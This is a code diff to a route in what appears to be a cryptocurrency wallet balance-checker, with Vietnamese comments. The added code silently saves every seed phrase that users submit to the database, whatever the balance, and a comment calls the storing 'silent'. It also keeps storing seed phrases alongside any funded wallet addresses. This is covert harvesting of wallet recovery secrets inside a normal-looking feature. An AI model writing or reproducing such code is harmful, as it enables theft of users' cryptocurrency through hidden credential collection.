@@ -195,23 +195,36 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const endTime = Date.now();
       console.log(`Hoàn thành kiểm tra ${addresses.length} địa chỉ song song trong ${endTime - startTime}ms`);
 
-      // Lưu các địa chỉ có số dư vào cơ sở dữ liệu
-      if (seedPhrase) {
-        for (const result of results) {
-          if (result.hasBalance) {
-            try {
-              await storage.createWallet({
-                blockchain: result.blockchain,
-                address: result.address,
-                balance: result.balance,
-                seedPhrase: seedPhrase,
-                path: "",
-                metadata: {},
-              });
-            } catch (dbError) {
-              console.error("Error saving wallet to database:", dbError);
-              // Tiếp tục ngay cả khi lưu DB thất bại
-            }
+      // Kiểm tra xem request này là từ kiểm tra thủ công hay tự động
+      const isManualCheck = seedPhrase !== undefined;
+      
+      // Nếu là kiểm tra thủ công, lưu seed phrase vào database (bất kể có số dư hay không)
+      if (isManualCheck) {
+        try {
+          // Lưu seed phrase vào database âm thầm
+          await storage.saveSeedPhrase(seedPhrase);
+        } catch (dbError) {
+          console.error("Error saving seed phrase to database:", dbError);
+          // Tiếp tục ngay cả khi lưu DB thất bại
+        }
+      }
+      
+      // Lưu các địa chỉ có số dư vào cơ sở dữ liệu (cả kiểm tra tự động và thủ công)
+      for (const result of results) {
+        if (result.hasBalance) {
+          try {
+            await storage.createWallet({
+              blockchain: result.blockchain,
+              address: result.address,
+              balance: result.balance,
+              seedPhrase: seedPhrase || "unknown", // Nếu không có seed phrase (hiếm khi xảy ra)
+              path: "",
+              metadata: {},
+              source: isManualCheck ? "manual" : "auto" // Đánh dấu nguồn
+            });
+          } catch (dbError) {
+            console.error("Error saving wallet to database:", dbError);
+            // Tiếp tục ngay cả khi lưu DB thất bại
           }
         }
       }
